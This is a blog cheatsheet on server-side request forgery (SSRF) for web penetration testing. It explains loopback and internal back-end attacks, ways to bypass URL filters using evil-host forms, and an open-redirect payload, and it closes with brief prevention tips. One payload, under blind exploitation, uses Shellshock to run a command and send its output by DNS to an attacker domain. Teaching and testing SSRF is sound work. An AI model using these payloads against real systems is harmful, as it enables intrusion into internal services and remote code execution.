---
title: "SSRF attack"
subtitle: ""
draft: false
author: "Hato0"
description: "SSRF cheatsheet"
Last Update: <time datetime="{{ .Page.Lastmod.Format "Mon Jan 10 17:13:38 2020 -0700" }}" class="text-muted">  {{ $.Page.Lastmod.Format "January 02, 2006" }} </time>
Date: 2022-06-20

tags: ["web", "penetest", "ssrf"]
categories: ["Penetest - Web"]

hiddenFromHomePage: true
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# Server-side request forgery

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. 

The attacker can supply or modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.

![alt Server-Side Request Forgery](https://www.vaadata.com/blog/wp-content/uploads/2018/05/SSRF-EN.jpg)

## Basics
- Local server

	This attack can be perform thanks to the loopback interface. Basicly you will have to find a parameter that fetch or possibly fetch an URL and loopback on the server himself to request the api or whatever. 
	
	For example with the website `fanOfNothing.com`, on the page `store`, the search engine included will pass your search to the api using the following post request : `searchFor=fanOfNothing.com:8008/api/search`. So your way to access what you want to is to change the `fanOfNothing.com:8008/api/search` to for example `fanOfNothing.com/admin`. In that way the result will be the admin page and not the initial response
	
	
- Against another back-end system

	Basicly the same, just scan for internal APIs and then fuzz endpoint and get result on the search thing

## Bypassing filters

- SSRF with blacklist-based input filter

	Basicly for this you will need imagination and a good understanding of what you have in front of you. For example if 127.0.0.1 is block you can replace it by 127.1 you can double url encode strings, etc ... 
	
	
- SSRF with whitelist-based input filter

	This one is very well explained by portswigger so here is the essentials.
	
	To bypass whitelisting you can use thse following techniques :
	-   You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
	-   You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
	-   You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
	-   You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
	-   You can use combinations of these techniques together.


- SSRF with filter bypass via open redirection vulnerability

	Same as the previous ones. Here is a payload example :
	`param=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://INTERNAL_IP/WHATEVER`


## Blind exploitation
- Blind SSRF with out-of-band detection

	Easiest blind attack to perform. If you just want to see if SSRF is a thing on the site, bounce back on your domain / IP and tcpdump to check incoming traffic. 
	
	
- Blind SSRF with Shellshock exploitation

	This will principally lead to RCE, you can set the following payload (`() { :; }; /usr/bin/nslookup $(COMMAND).YOUR_DOMAIN`) on the Web agent field and exploit the SSRF as indicate in previous setps

## How to prevent them 

You have several way to implement a protection for this type of attack. Here are some of them :	

-	Input validation (regex, whitelist, ...)
-	If you are using .NET, it can be expose to hex, dword, octal and mixed encoding
-	Ensure that the domain is a trusted and valid one
-	Configure a firewall to explicitly set legitimate flows
-	....